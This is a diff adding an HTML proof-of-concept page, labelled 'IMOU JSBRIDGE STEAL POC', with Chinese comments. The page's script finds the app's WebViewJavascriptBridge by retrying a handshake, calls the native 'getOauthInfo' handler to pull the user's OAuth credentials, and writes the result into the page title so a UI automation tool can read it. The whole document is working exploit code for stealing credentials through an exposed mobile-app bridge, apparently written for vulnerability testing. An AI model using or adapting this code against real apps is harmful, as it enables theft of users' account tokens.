@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>STEAL-S0-loaded</title>
+</head>
+<body style="background:#000;color:#0f0;font-family:monospace">
+<h2>IMOU JSBRIDGE STEAL POC</h2>
+<pre id="log">booting...</pre>
+<script>
+(function(){
+  var logEl = null;
+  function stage(t){ try{ document.title = t; }catch(e){} }
+
+  // 标准 WebViewJavascriptBridge 握手
+  function setupWebViewJavascriptBridge(callback) {
+    if (window.WebViewJavascriptBridge) { return callback(window.WebViewJavascriptBridge); }
+    if (window.WVJBCallbacks) { return window.WVJBCallbacks.push(callback); }
+    window.WVJBCallbacks = [callback];
+    var WVJBIframe = document.createElement('iframe');
+    WVJBIframe.style.display = 'none';
+    WVJBIframe.src = 'https://__bridge_loaded__';
+    document.documentElement.appendChild(WVJBIframe);
+    setTimeout(function(){ document.documentElement.removeChild(WVJBIframe); }, 0);
+  }
+
+  // 把结果写到 title（uiautomator 可抓）与 body（可选兜底）
+  function dumpResult(tag, res){
+    if (res === undefined || res === null) { stage(tag + '|NULL'); return; }
+    if (res === '') { stage(tag + '|EMPTY'); return; }
+    stage(tag + '|' + res);
+  }
+
+  function fire(){
+    stage('STEAL-S2-bridge-ok');
+    try {
+      window.WebViewJavascriptBridge.callHandler('getOauthInfo', '', function(res){
+        dumpResult('STEAL-S3-oauth', res);
+      });
+      stage('STEAL-S2-sent');
+    } catch(e){
+      stage('STEAL-ERR|' + e);
+    }
+    // 兜底：2.5s 后若仍未收到回调，说明可能被 deny 或未登录
+    setTimeout(function(){
+      var t = document.title;
+      if (t.indexOf('S3') < 0) { stage('STEAL-S4-nocb|title=' + t); }
+    }, 2500);
+  }
+
+  // 尝试多次握手，兼容 bridge 注入时序
+  var tries = 0;
+  function trySetup(){
+    tries++;
+    stage('STEAL-S1-try' + tries);
+    setupWebViewJavascriptBridge(function(bridge){
+      if (bridge) { fire(); }
+      else if (tries < 6) { setTimeout(trySetup, 500); }
+      else { stage('STEAL-S1-nobridge'); }
+    });
+    // 如果 bridge 一直没出现，1s 后再试
+    if (!window.WebViewJavascriptBridge && tries < 6) {
+      setTimeout(trySetup, 1000);
+    }
+  }
+  setTimeout(trySetup, 300);
+})();
+</script>
+</body>
+</html>
